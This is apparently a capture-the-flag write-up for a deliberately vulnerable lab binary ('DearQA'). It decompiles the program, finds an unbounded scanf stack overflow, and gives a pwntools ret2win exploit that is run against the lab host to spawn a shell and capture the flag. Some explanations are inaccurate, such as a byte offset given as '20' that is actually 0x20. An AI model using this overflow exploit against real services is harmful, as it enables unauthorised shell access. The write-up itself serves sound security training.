Vulnerable file : DearQA.DearQA 
Target ip : 10.10.156.111

---

Analyzing file:
```bash
file DearQA-1627223337406.DearQA 
```
```
DearQA-1627223337406.DearQA: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dae71dcf7b3fe612fe9f7a4d0fa068ff3fc93bd, not stripped
```

---

Port 5700 is running the program. We can run it by running :
```bash
nc 10.10.156.111 5700
```

----

That how looks the decompily /  desassambly code (Bonaryninja)
```C
int64_t vuln()
{
    puts("Congratulations!");
    puts("You have entered in the secret f…");
    fflush(stdout);
	return execve("/bin/bash", 0, 0);
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    puts("Welcome dearQA");
    puts("I am sysadmin, i am new in devel…");
    printf("What's your name: ");
    fflush(stdout);
    void var_28;
    __isoc99_scanf("%s", &var_28);
    printf("Hello: %s\n", &var_28);
    return 0;
}

```

```ASM
vuln:
	push    rbp {__saved_rbp}
    mov     rbp, rsp {__saved_rbp}
	mov     edi, 0x4007b8  {"Congratulations!"}
    call    puts
    mov     edi, 0x4007d0  {"You have entered in the secret f…"}
    call    puts
    mov     rax, qword [rel stdout]
    mov     rdi, rax
    call    fflush
    mov     edx, 0x0
    mov     esi, 0x0
    mov     edi, 0x4007f9  {"/bin/bash"}
    call    execve
    pop     rbp {__saved_rbp}
    retn     {__return_addr}

main:
    push    rbp {__saved_rbp}
    mov     rbp, rsp {__saved_rbp}
    sub     rsp, 0x20
    mov     edi, 0x400803  {"Welcome dearQA"}
    call    puts
    mov     edi, 0x400818  {"I am sysadmin, i am new in devel…"}
    call    puts
    mov     edi, 0x40083e  {"What's your name: "}
    mov     eax, 0x0
    call    printf
    mov     rax, qword [rel stdout]
    mov     rdi, rax
    call    fflush
    lea     rax, [rbp-0x20 {var_28}]
    mov     rsi, rax {var_28}
    mov     edi, 0x400851
    mov     eax, 0x0
    call    __isoc99_scanf
    lea     rax, [rbp-0x20 {var_28}]
    mov     rsi, rax {var_28}
    mov     edi, 0x400854  {"Hello: %s\n"}
    mov     eax, 0x0
    call    printf
    mov     eax, 0x0
    leave    {__saved_rbp}
    retn     {__return_addr}
```

---

STACK :

High addresses on top to low addresses on bottom
Pushing and element into the stack is adding to the stack, to the closest AND lowest address he can.

```ASM
lea rax, [rbp-0x20 {var_28}]
```

|               | 0xffffff                   |                    |
| ------------- | -------------------------- | ------------------ |
|               | RIP : address of main func |                    |
|               | RBP                        | Register to find ! |
|               |                            |                    |
| in the stack  |                            |                    |
| goes this way |                            |                    |
| message and   |                            |                    |
| I'm writing a | 0x004006fd : rbp - 0x20    |                    |
|               |                            |                    |
|               |                            |                    |
|               |                            |                    |
|               | 0x00000                    |                    |
There is 20 bytes to write on the stack before reaching RBP.  
Then, there is 8 bytes (1 stack instruction) to reach RIP, the register we want to write on.

---

Let's make a python exploit script :
```Python
from pwn import *

context.binary = binary = "./DearQA.DearQA"

static = ELF(binary)


"""
No PIE, co Canary so addresses are not randomly placed and they will stay persistant

scanf writes rbp-20
20 bytes to reach RBP : "A"
8 bytes to reach rip  : "B"
vuln() address

"""

vuln_address = p64(static.symbols.vuln)  #Address of vuln symbol strings

#p64() make the address from 64bits to 8bits and convert it to little endian

payload = b"A"*0x20 + b"B"*0x8 + vuln_address

p = process()
p.recvuntil(b"name:")
p.sendline(payload)
p.interactive()
```

```bash
python3 exploit.py
```
```
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06@
Congratulations!
You have entered in the secret function!
$ id
uid=1000(vdarras)
```

---

Success ! Now let's put that on the real program running on port 5700 of the target ip, let's modify the python script :

```python
```Python
from pwn import *

context.binary = binary = "./DearQA.DearQA"

static = ELF(binary)

vuln_address = p64(static.symbols.vuln)

payload = b"A"*0x20 + b"B"*0x8 + vuln_address

p = remote("10.10.156.111", 5700) #IP and Port to execute the payload
p.recvuntil(b"name:")
p.sendline(payload)
p.interactive()
```

```bash
python3 exploit.py
```
```
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\x86\x06@
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (446): Inappropriate ioctl for device
bash: no job control in this shell
ctf@dearqa:/home/ctf$ $ id
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
```

Flag : THM{PWN_1S_V3RY_E4SY}